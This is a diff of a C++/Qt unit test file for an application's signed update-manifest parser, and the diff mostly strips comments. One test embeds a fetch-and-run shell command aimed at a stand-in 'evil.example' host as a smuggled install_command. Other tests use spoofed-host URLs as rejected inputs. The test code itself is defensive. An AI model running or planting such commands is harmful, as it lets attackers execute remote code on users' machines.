@@ -1,12 +1,3 @@
-// Lightning secure update system: signature envelope, Ed25519 verification
-// and strict manifest parsing.
-//
-// The signing key is generated at runtime through OpenSSL; no key material
-// exists in the repository and no private key is written or printed.
-//
-// A manifest field is used only after the detached signature over the raw
-// bytes verifies against a key this build trusts, and nothing in the manifest
-// can name a command to run.
 
 #include "update/InstallType.h"
 #include "update/SignatureVerifier.h"
@@ -40,8 +31,6 @@ using lightning::update::Version;
 
 namespace {
 
-// A trust store whose keys are supplied by the test — the compiled-in table
-// is never modified and no key material is committed.
 class FixedTrustStore final : public TrustStore
 {
 public:
@@ -52,7 +41,6 @@ public:
     }
 };
 
-// Runtime Ed25519 keypair.
 class TestSigner
 {
 public:
@@ -134,15 +122,12 @@ QString canonicalArtifactUrl(const QString &filename)
         .arg(lightning::update::canonicalUpdateHost(), filename);
 }
 
-// The first compiled-in bandwidth mirror. Empty in a build that trusts none.
 QString mirrorHost()
 {
     const QStringList hosts = lightning::update::mirrorArtifactHosts();
     return hosts.isEmpty() ? QString() : hosts.first();
 }
 
-// The immutable, version-specific asset form the release authority publishes
-// — never a "/releases/latest/download/..." address.
 QString mirrorArtifactUrl(const QString &filename)
 {
     return QStringLiteral("https://%1/Mizerd/lightning/releases/download/v0.8.0/%2")
@@ -162,8 +147,6 @@ QJsonObject artifactObject(const QString &filename = QStringLiteral("lightning_0
     return artifact;
 }
 
-// baseManifest() with the single linux-deb entry carrying `mirror` as its
-// optional mirror_url. A QJsonValue so the "wrong type" cases are expressible.
 QJsonObject manifestWithMirror(const QJsonValue &mirror,
                                const QString &filename = QStringLiteral(
                                    "lightning_0.8.0_amd64.deb"));
@@ -203,7 +186,7 @@ QByteArray serialise(const QJsonObject &object)
     return QJsonDocument(object).toJson(QJsonDocument::Compact);
 }
 
-} // namespace
+}
 
 class UpdateManifestTest : public QObject
 {
@@ -306,7 +289,6 @@ void UpdateManifestTest::verifiesAValidManifest()
     QCOMPARE(artifact->sha256, kValidHash);
     QCOMPARE(artifact->url.scheme(), QStringLiteral("https"));
 
-    // No artifact was published for another install type.
     QVERIFY(!manifest.artifactFor(InstallType::LinuxRpm).has_value());
 }
 
@@ -314,10 +296,9 @@ void UpdateManifestTest::rejectsATamperedManifest()
 {
     QByteArray bytes = serialise(baseManifest());
     const QByteArray signature = m_signer.sign(bytes);
-    // One byte of the signed document is changed after signing.
     const qsizetype index = bytes.indexOf("0.8.0");
     QVERIFY(index > 0);
-    bytes[index + 2] = '9'; // 0.8.0 -> 0.9.0
+    bytes[index + 2] = '9';
 
     const UpdateManifest::Result result = UpdateManifest::parseVerified(
         bytes, makeEnvelope(QString::fromLatin1(kKeyId), signature), m_trust);
@@ -337,8 +318,6 @@ void UpdateManifestTest::rejectsAnUnknownKeyId()
 
 void UpdateManifestTest::rejectsARetiredOrAbsentCompiledKey()
 {
-    // The compiled-in store has no key material in a source build, and a
-    // retired entry is never returned either: both read as "unknown".
     lightning::update::CompiledTrustStore compiled;
     const QByteArray bytes = serialise(baseManifest());
     const UpdateManifest::Result result = UpdateManifest::parseVerified(
@@ -346,8 +325,6 @@ void UpdateManifestTest::rejectsARetiredOrAbsentCompiledKey()
         compiled);
     QVERIFY(!result.ok);
     if (lightning::update::hasUsableTrustedKey()) {
-        // A release build carries a real key; the test's signature is not
-        // the one it trusts, so this must still fail.
         QCOMPARE(result.error, ManifestError::SignatureInvalid);
     } else {
         QCOMPARE(result.error, ManifestError::SignatureUnknownKey);
@@ -393,7 +370,6 @@ void UpdateManifestTest::rejectsAMalformedSignatureLength()
                  .error,
              ManifestError::SignatureMalformed);
 
-    // Not base64 at all.
     SignatureError parseError = SignatureError::None;
     QVERIFY(!lightning::update::parseSignatureEnvelope(
                  QByteArrayLiteral(R"({"alg":"ed25519","key_id":"k","sig":"not base64 !!"})"),
@@ -409,7 +385,6 @@ void UpdateManifestTest::rejectsAnEmptySignatureDocument()
              ManifestError::SignatureMissing);
     QCOMPARE(UpdateManifest::parseVerified(bytes, QByteArrayLiteral("{}"), m_trust).error,
              ManifestError::SignatureMalformed);
-    // Oversized envelopes are refused before any JSON parsing.
     const QByteArray huge(int(lightning::update::kMaxSignatureEnvelopeBytes) + 1, 'x');
     QCOMPARE(UpdateManifest::parseVerified(bytes, huge, m_trust).error,
              ManifestError::SignatureMalformed);
@@ -417,8 +392,6 @@ void UpdateManifestTest::rejectsAnEmptySignatureDocument()
 
 void UpdateManifestTest::verifiesBeforeParsing()
 {
-    // Invalid JSON with a signature over something else: the error must be the
-    // signature, proving the document was never parsed first.
     const QByteArray garbage = QByteArrayLiteral("this is not json at all");
     const QByteArray foreignSignature = m_signer.sign(QByteArrayLiteral("a different payload"));
     const UpdateManifest::Result unsigned_ = UpdateManifest::parseVerified(
@@ -426,12 +399,10 @@ void UpdateManifestTest::verifiesBeforeParsing()
     QVERIFY(!unsigned_.ok);
     QCOMPARE(unsigned_.error, ManifestError::SignatureInvalid);
 
-    // Correctly signed garbage gets as far as the JSON parse and no further.
     const UpdateManifest::Result signedGarbage = verify(garbage);
     QVERIFY(!signedGarbage.ok);
     QCOMPARE(signedGarbage.error, ManifestError::ManifestNotJson);
 
-    // A signed JSON array is not a manifest either.
     const QByteArray array = QByteArrayLiteral("[1,2,3]");
     QCOMPARE(verify(array).error, ManifestError::ManifestNotObject);
 }
@@ -443,7 +414,6 @@ void UpdateManifestTest::rejectsSchemaTwoDistinctly()
     const UpdateManifest::Result result = verify(manifest);
     QVERIFY(!result.ok);
     QCOMPARE(result.error, ManifestError::UnsupportedSchema);
-    // The message tells the user to update manually rather than guessing.
     QVERIFY(result.message.contains(QStringLiteral("manually")));
 
     manifest.insert(QStringLiteral("schema"), QStringLiteral("1"));
@@ -466,9 +436,6 @@ void UpdateManifestTest::rejectsANonPositiveUpdaterRequirement_data()
 {
     QTest::addColumn<QJsonValue>("value");
 
-    // Updater contract versions start at 1. A manifest claiming 0 (or less)
-    // is not "compatible with everything" — it is a manifest this build has
-    // no agreed contract with, and it is refused rather than guessed at.
     QTest::newRow("zero") << QJsonValue(0);
     QTest::newRow("negative") << QJsonValue(-1);
     QTest::newRow("fractional") << QJsonValue(0.5);
@@ -588,7 +555,6 @@ void UpdateManifestTest::rejectsANonHttpsUrl()
     manifest.insert(QStringLiteral("artifacts"), artifacts);
     QCOMPARE(verify(manifest).error, ManifestError::ArtifactBadUrl);
 
-    // file:// and other schemes are refused just as firmly.
     artifact.insert(QStringLiteral("url"), QStringLiteral("file:///tmp/lightning_0.8.0_amd64.deb"));
     artifacts.insert(QStringLiteral("linux-deb"), artifact);
     manifest.insert(QStringLiteral("artifacts"), artifacts);
@@ -599,12 +565,10 @@ void UpdateManifestTest::rejectsAForeignHost()
 {
     const QStringList foreign{
         QStringLiteral("https://evil.example/lightning_0.8.0_amd64.deb"),
-        // A suffix that merely ENDS with the canonical host must not pass.
         QStringLiteral("https://evil-%1/lightning_0.8.0_amd64.deb")
             .arg(lightning::update::canonicalUpdateHost()),
         QStringLiteral("https://%1.evil.example/lightning_0.8.0_amd64.deb")
             .arg(lightning::update::canonicalUpdateHost()),
-        // Credentials in the URL are refused outright.
         QStringLiteral("https://user:pass@%1/lightning_0.8.0_amd64.deb")
             .arg(lightning::update::canonicalUpdateHost()),
     };
@@ -646,9 +610,6 @@ void UpdateManifestTest::rejectsAForeignReleaseNotesLink()
     QCOMPARE(ok.manifest.releaseNotesUrl().host(), lightning::update::canonicalUpdateHost());
 }
 
-// Metadata is canonical-only: a mirror may carry artifact bytes and nothing
-// else, or a compromised mirror could put its own page behind the "release
-// notes" affordance.
 void UpdateManifestTest::rejectsAReleaseNotesLinkOnAMirrorHost()
 {
     if (mirrorHost().isEmpty())
@@ -660,16 +621,11 @@ void UpdateManifestTest::rejectsAReleaseNotesLinkOnAMirrorHost()
                         .arg(mirrorHost()));
     QCOMPARE(verify(manifest).error, ManifestError::ReleaseNotesUrlRejected);
 
-    // ...and the same address IS acceptable for artifact bytes, which is
-    // exactly the distinction the two predicates exist to keep.
     QVERIFY(!isAllowedManifestUrl(
         QUrl(QStringLiteral("https://%1/Mizerd/lightning/releases/tag/v0.8.0").arg(mirrorHost()))));
     QVERIFY(isAllowedArtifactUrl(QUrl(mirrorArtifactUrl(QStringLiteral("x.deb")))));
 }
 
-// The canonical `url` is what the mirror falls back to, so it must be on the
-// release authority's own host; otherwise both addresses could share one
-// third party and one outage would leave no working source.
 void UpdateManifestTest::rejectsACanonicalUrlOnAMirrorHost()
 {
     if (mirrorHost().isEmpty())
@@ -678,8 +634,6 @@ void UpdateManifestTest::rejectsACanonicalUrlOnAMirrorHost()
     const QString filename = QStringLiteral("lightning_0.8.0_amd64.deb");
     QJsonObject manifest = baseManifest();
     QJsonObject artifact = artifactObject(filename);
-    // A host that is perfectly acceptable for ARTIFACT bytes, used where only
-    // the canonical host belongs.
     artifact.insert(QStringLiteral("url"), mirrorArtifactUrl(filename));
     QJsonObject artifacts;
     artifacts.insert(QStringLiteral("linux-deb"), artifact);
@@ -699,7 +653,6 @@ void UpdateManifestTest::acceptsAnOptionalMirrorUrl()
     const UpdateManifest::Result result =
         verify(manifestWithMirror(QJsonValue(mirrorArtifactUrl(filename))));
     QVERIFY2(result.ok, qPrintable(result.message));
-    // schema stays 1: an optional field is compatible in both directions.
     QCOMPARE(result.manifest.schema(), 1);
 
     const auto artifact = result.manifest.artifactFor(InstallType::LinuxDeb);
@@ -707,13 +660,9 @@ void UpdateManifestTest::acceptsAnOptionalMirrorUrl()
     QCOMPARE(artifact->mirrorUrl.toString(), mirrorArtifactUrl(filename));
     QCOMPARE(artifact->mirrorUrl.host(), mirrorHost());
     QCOMPARE(artifact->mirrorUrl.fileName(), filename);
-    // The canonical address is untouched and remains the fallback.
     QCOMPARE(artifact->url.host(), lightning::update::canonicalUpdateHost());
-    // A mirror URL is a plain immutable asset address, never the moving
-    // "/releases/latest/download/..." form.
     QVERIFY(!artifact->mirrorUrl.path().contains(QStringLiteral("releases/latest")));
 
-    // An explicit JSON null reads as "no mirror", not as a malformed one.
     const UpdateManifest::Result nulled =
         verify(manifestWithMirror(QJsonValue(QJsonValue::Null)));
     QVERIFY2(nulled.ok, qPrintable(nulled.message));
@@ -740,8 +689,6 @@ void UpdateManifestTest::rejectsAMirrorOnAnUnlistedHost_data()
 
     QTest::newRow("unrelated host")
         << QStringLiteral("https://evil.example/%1").arg(file);
-    // A suffix that merely ENDS with a mirror host must not pass, and neither
-    // must a subdomain of one: the match is exact.
     QTest::newRow("suffix trick") << QStringLiteral("https://evil-%1/%2").arg(mirror, file);
     QTest::newRow("subdomain trick")
         << QStringLiteral("https://%1.evil.example/%2").arg(mirror, file);
@@ -750,9 +697,6 @@ void UpdateManifestTest::rejectsAMirrorOnAnUnlistedHost_data()
         << QStringLiteral("https://%1:8443/%2").arg(mirror, file);
 }
 
-// An untrusted mirror host is ignored, not fatal: failing the whole document
-// would stop older clients with a stale host list from ever updating again
-// after the mirror moves. Dropping the field is still fail-closed on trust.
 void UpdateManifestTest::rejectsAMirrorOnAnUnlistedHost()
 {
     if (mirrorHost().isEmpty())
@@ -765,10 +709,7 @@ void UpdateManifestTest::rejectsAMirrorOnAnUnlistedHost()
 
     const auto artifact = result.manifest.artifactFor(InstallType::LinuxDeb);
     QVERIFY(artifact.has_value());
-    // The untrusted mirror is gone...
     QVERIFY(artifact->mirrorUrl.isEmpty());
-    // ...and the artifact still downloads from the canonical source exactly as
-    // it did before mirrors existed.
     QCOMPARE(artifact->url.host(), lightning::update::canonicalUpdateHost());
     QCOMPARE(artifact->sha256, kValidHash);
 }
@@ -798,8 +739,6 @@ void UpdateManifestTest::rejectsAnInsecureOrMalformedMirrorUrl()
     QCOMPARE(result.error, ManifestError::ArtifactBadMirrorUrl);
 }
 
-// The same agreement the canonical address must keep: one entry describes ONE
-// file, so its size and sha256 refer to one thing whichever source serves it.
 void UpdateManifestTest::rejectsAMirrorThatDisagreesWithTheFilename()
 {
     if (mirrorHost().isEmpty())
@@ -816,57 +755,41 @@ void UpdateManifestTest::separatesMetadataAndArtifactHostPolicies()
     const QStringList mirrors = lightning::update::mirrorArtifactHosts();
 
 #ifndef LIGHTNING_UPDATE_MIRROR_HOSTS
-    // The documented default of a build that does not override the list.
     QCOMPARE(mirrors,
              (QStringList{ QStringLiteral("github.com"),
                            QStringLiteral("objects.githubusercontent.com"),
                            QStringLiteral("release-assets.githubusercontent.com") }));
 #endif
 
-    // The mirrored manifest pair is read only after the canonical host fails,
-    // and it is still a mirror host, so the canonical predicate must keep
-    // refusing it.
     const QUrl mirrorManifest = mirrorLatestManifestUrl();
     const QUrl mirrorSignature = mirrorLatestManifestSignatureUrl();
     if (!mirrorManifest.isEmpty()) {
         QVERIFY(isAllowedFallbackManifestUrl(mirrorManifest));
         QVERIFY(isAllowedFallbackManifestUrl(mirrorSignature));
-        // A mirror is still not the canonical metadata source.
         QVERIFY(!isAllowedManifestUrl(mirrorManifest));
         QVERIFY(!isAllowedManifestUrl(mirrorSignature));
-        // HTTPS, no credentials, no odd port — the same transport rules.
         QCOMPARE(mirrorManifest.scheme(), QStringLiteral("https"));
         QVERIFY(mirrorManifest.userInfo().isEmpty());
         QVERIFY(mirrors.contains(mirrorManifest.host().toLower()));
-        // The two documents differ and both are under the same fixed base:
-        // a "latest release" URL would let the mirror choose which release
-        // answers, which is what the no-API source scan forbids.
         QVERIFY(mirrorManifest != mirrorSignature);
         QVERIFY(!mirrorManifest.path().contains(QStringLiteral("releases/latest")));
     }
-    // The canonical predicate never accepts a mirror host, and the fallback
-    // predicate never accepts the canonical one.
     QVERIFY(!isAllowedFallbackManifestUrl(
         QUrl(QStringLiteral("https://%1/a/b").arg(canonical))));
 
-    // Both roles accept the canonical host, and it is never duplicated in the
-    // mirror list.
     QVERIFY(isAllowedManifestUrl(QUrl(QStringLiteral("https://%1/a/b").arg(canonical))));
     QVERIFY(isAllowedArtifactUrl(QUrl(QStringLiteral("https://%1/a/b").arg(canonical))));
     QVERIFY(!mirrors.contains(canonical));
 
     for (const QString &host : mirrors) {
-        // Entries are lowercase bare hosts; nothing half-parsed survives.
         QCOMPARE(host, host.toLower());
         QVERIFY(!host.contains(QLatin1Char('/')));
         QVERIFY(!host.contains(QLatin1Char(':')));
         QVERIFY(!host.isEmpty());
-        // A mirror carries BYTES and never metadata.
         const QUrl url(QStringLiteral("https://%1/Mizerd/lightning/releases/download/v0.8.0/a.deb")
                            .arg(host));
         QVERIFY2(isAllowedArtifactUrl(url), qPrintable(host));
         QVERIFY2(!isAllowedManifestUrl(url), qPrintable(host));
-        // Every other transport rule still applies to a mirror.
         QVERIFY(!isAllowedArtifactUrl(QUrl(QStringLiteral("http://%1/a.deb").arg(host))));
         QVERIFY(!isAllowedArtifactUrl(QUrl(QStringLiteral("https://%1:8443/a.deb").arg(host))));
         QVERIFY(!isAllowedArtifactUrl(QUrl(QStringLiteral("https://u:p@%1/a.deb").arg(host))));
@@ -874,7 +797,6 @@ void UpdateManifestTest::separatesMetadataAndArtifactHostPolicies()
         QVERIFY(!isAllowedArtifactUrl(QUrl(QStringLiteral("https://%1.evil.example/a.deb").arg(host))));
     }
 
-    // allowedUpdateHosts() is the diagnostic union, canonical first.
     const QStringList all = lightning::update::allowedUpdateHosts();
     QVERIFY(!all.isEmpty());
     QCOMPARE(all.first(), canonical);
@@ -889,8 +811,6 @@ void UpdateManifestTest::ignoresUnknownFieldsAndArtifactKeys()
     manifest.insert(QStringLiteral("nested"), QJsonObject{ { QStringLiteral("a"), 1 } });
 
     QJsonObject artifacts = manifest.value(QStringLiteral("artifacts")).toObject();
-    // An install type this build has never heard of, and one Lightning
-    // never installs itself: both ignored, neither an error.
     artifacts.insert(QStringLiteral("linux-fooix"), artifactObject(QStringLiteral("x.fooix")));
     artifacts.insert(QStringLiteral("linux-flatpak"), artifactObject(QStringLiteral("x.flatpak")));
     manifest.insert(QStringLiteral("artifacts"), artifacts);
@@ -904,9 +824,6 @@ void UpdateManifestTest::ignoresUnknownFieldsAndArtifactKeys()
 
 void UpdateManifestTest::manifestCanNeverCarryACommand()
 {
-    // A signed manifest that tries to smuggle an install command: parsing
-    // succeeds (unknown fields are ignored) and nothing in the parsed manifest
-    // can hold the text.
     const QString payload = QStringLiteral("/bin/sh -c 'curl evil.example | sh'");
     QJsonObject manifest = baseManifest();
     manifest.insert(QStringLiteral("install_command"), payload);
@@ -916,8 +833,6 @@ void UpdateManifestTest::manifestCanNeverCarryACommand()
     QJsonObject artifacts = manifest.value(QStringLiteral("artifacts")).toObject();
     QJsonObject artifact = artifacts.value(QStringLiteral("linux-deb")).toObject();
     artifact.insert(QStringLiteral("install_command"), payload);
-    // The mirror address is inside the signed bytes too, so it gets the same
-    // scrutiny: it is a URL and nothing else.
     if (!mirrorHost().isEmpty()) {
         artifact.insert(QStringLiteral("mirror_url"),
                         mirrorArtifactUrl(QStringLiteral("lightning_0.8.0_amd64.deb")));
@@ -943,7 +858,6 @@ void UpdateManifestTest::manifestCanNeverCarryACommand()
         QVERIFY2(!value.contains(QStringLiteral("curl")), qPrintable(value));
         QVERIFY2(!value.contains(QStringLiteral("/bin/sh")), qPrintable(value));
     }
-    // The artifact remains exactly what it was without the injected fields.
     QCOMPARE(parsed.artifactFor(InstallType::LinuxDeb)->filename,
              QStringLiteral("lightning_0.8.0_amd64.deb"));
 }
@@ -969,13 +883,9 @@ void UpdateManifestTest::modelsEcosystemChannels()
     QVERIFY2(result.ok, qPrintable(result.message));
 
     const Version installed = *Version::parse(QStringLiteral("0.7.0"));
-    // Available AND newer.
     QVERIFY(result.manifest.channelOffersUpdate(QStringLiteral("linux-snap"), installed));
-    // Unavailable, even though the release itself is newer.
     QVERIFY(!result.manifest.channelOffersUpdate(QStringLiteral("linux-flatpak"), installed));
-    // Available but not newer.
     QVERIFY(!result.manifest.channelOffersUpdate(QStringLiteral("linux-deb-repo"), installed));
-    // Absent entirely.
     QVERIFY(!result.manifest.channelOffersUpdate(QStringLiteral("linux-rpm-repo"), installed));
 
     const std::optional<ManifestChannel> flatpak =
@@ -985,7 +895,6 @@ void UpdateManifestTest::modelsEcosystemChannels()
     QVERIFY(!flatpak->version.has_value());
     QCOMPARE(flatpak->note, QStringLiteral("pending Flathub publication"));
 
-    // A malformed channel version is an error, not a silent zero.
     channels.insert(QStringLiteral("linux-snap"),
                     QJsonObject{ { QStringLiteral("available"), true },
                                  { QStringLiteral("version"), QStringLiteral("latest") } });
@@ -995,8 +904,6 @@ void UpdateManifestTest::modelsEcosystemChannels()
 
 void UpdateManifestTest::aRepositoryRpmReadsItsChannelAndNeverAnArtifact()
 {
-    // A COPR install reads the linux-rpm-repo channel, as Flatpak and Snap read
-    // theirs.
     QCOMPARE(UpdateManifest::channelIdForInstallType(InstallType::LinuxRpmRepo),
              QStringLiteral("linux-rpm-repo"));
     QCOMPARE(UpdateManifest::channelIdForInstallType(InstallType::LinuxFlatpak),
@@ -1004,8 +911,6 @@ void UpdateManifestTest::aRepositoryRpmReadsItsChannelAndNeverAnArtifact()
     QCOMPARE(UpdateManifest::channelIdForInstallType(InstallType::LinuxSnap),
              QStringLiteral("linux-snap"));
 
-    // An artifact keyed for it is ignored: nothing in a manifest can hand a
-    // repository install a file to install.
     QJsonObject manifest = baseManifest();
     QJsonObject artifacts = manifest.value(QStringLiteral("artifacts")).toObject();
     const QJsonObject rpm = artifactObject(QStringLiteral("lightning-0.8.0-1.x86_64.rpm"));
@@ -1034,8 +939,6 @@ void UpdateManifestTest::validatesHashAndFilenameHelpers()
 void UpdateManifestTest::validatesUpdateUrls()
 {
     const QString host = lightning::update::canonicalUpdateHost();
-    // The transport rules are identical for both roles; only the accepted
-    // host set differs, so both predicates are asserted on each rule.
     for (const auto &allowed : { &isAllowedManifestUrl, &isAllowedArtifactUrl }) {
         QVERIFY((*allowed)(QUrl(QStringLiteral("https://%1/a/b").arg(host))));
         QVERIFY((*allowed)(QUrl(QStringLiteral("https://%1:443/a/b").arg(host))));
@@ -1047,8 +950,6 @@ void UpdateManifestTest::validatesUpdateUrls()
         QVERIFY(!(*allowed)(QUrl()));
     }
 
-    // The endpoints this build will use are METADATA: canonical host only,
-    // no query parameters, no credentials.
     for (const QUrl &url : { lightning::update::latestManifestUrl(),
                              lightning::update::latestManifestSignatureUrl(),
                              lightning::update::manifestUrlForVersion(QStringLiteral("0.8.0")),
@@ -1061,11 +962,8 @@ void UpdateManifestTest::validatesUpdateUrls()
     }
 }
 
-
 void UpdateManifestTest::expiryIsOptionalAndInformational()
 {
-    // A manifest with no expiry, or one long past it, must keep working:
-    // absent reads as never.
     QJsonObject manifest = baseManifest();
     manifest.remove(QStringLiteral("expires"));
     UpdateManifest::Result result = verify(manifest);
@@ -1075,7 +973,7 @@ void UpdateManifestTest::expiryIsOptionalAndInformational()
     result = verify(manifest);
     QVERIFY2(result.ok, qPrintable(result.message));
     QVERIFY(!result.manifest.expires().isValid());
-    QVERIFY(!result.manifest.expiresMalformed()); // empty is "none", not garbage
+    QVERIFY(!result.manifest.expiresMalformed());
     const UpdateManifest::Result dated = verify(baseManifest());
     QVERIFY2(dated.ok, qPrintable(dated.message));
     QCOMPARE(dated.manifest.expires(),
@@ -1087,17 +985,12 @@ void UpdateManifestTest::aMalformedExpiryReadsAsNone_data()
     QTest::addColumn<QJsonValue>("value");
     QTest::newRow("not a date") << QJsonValue(QStringLiteral("soon"));
     QTest::newRow("number") << QJsonValue(1700000000);
-    // No zone designator: a local time on whatever machine reads it.
     QTest::newRow("local time") << QJsonValue(QStringLiteral("2026-12-14T12:00:00"));
-    // Qt parses a bare date as the LOCAL start of that day, so this is the
-    // zone guard's branch, not the validity one.
     QTest::newRow("date only") << QJsonValue(QStringLiteral("2026-12-14"));
 }
 
 void UpdateManifestTest::aMalformedExpiryReadsAsNone()
 {
-    // Never a failure -- but never silently "no expiry" either: the manager
-    // shows the stale line for a value it could not read.
     QFETCH(QJsonValue, value);
     QJsonObject manifest = baseManifest();
     manifest.insert(QStringLiteral("expires"), value);
@@ -1105,15 +998,12 @@ void UpdateManifestTest::aMalformedExpiryReadsAsNone()
     QVERIFY2(result.ok, qPrintable(result.message));
     QVERIFY(!result.manifest.expires().isValid());
     QVERIFY(result.manifest.expiresMalformed());
-    // Absent is different: no expiry, nothing malformed.
     manifest.remove(QStringLiteral("expires"));
     QVERIFY(!verify(manifest).manifest.expiresMalformed());
 }
 
 void UpdateManifestTest::boundsAChannelNote()
 {
-    // A signed document is still an unbounded one, and this string reaches a
-    // status label.
     QJsonObject channels;
     channels.insert(QStringLiteral("linux-flatpak"),
                     QJsonObject{ { QStringLiteral("available"), false },
